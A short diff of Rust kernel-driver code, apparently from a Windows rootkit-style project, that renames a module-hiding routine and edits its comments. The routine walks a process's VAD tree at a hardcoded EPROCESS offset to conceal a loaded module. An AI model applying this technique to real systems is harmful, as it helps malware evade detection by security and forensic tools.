@@ -190,13 +190,13 @@ impl Module {
         KeUnstackDetachProcess(&mut apc_state);
 
         if !address.is_null() {
-            Self::hide_vad(address as u64, target);
+            Self::hide_object(address as u64, target);
         }
 
         Ok(())
     }
 
-    /// Hides a VAD (Virtual Address Descriptor) in the target process.
+    /// Removing the module name in the FILE_OBJECT structure.
     ///
     /// # Parameters
     /// - `target_address`: The address of the module to hide.
@@ -205,7 +205,7 @@ impl Module {
     /// # Returns
     /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the VAD is successfully hidden, otherwise returns an appropriate error status.
     ///
-    pub unsafe fn hide_vad(target_address: u64, target_eprocess: Process) -> Result<(), NTSTATUS> {
+    pub unsafe fn hide_object(target_address: u64, target_eprocess: Process) -> Result<(), NTSTATUS> {
         let vad_root = 0x7d8;
         let vad_table = target_eprocess.e_process.cast::<u8>().offset(vad_root) as *mut RTL_BALANCED_NODE;
         let current_node = vad_table;
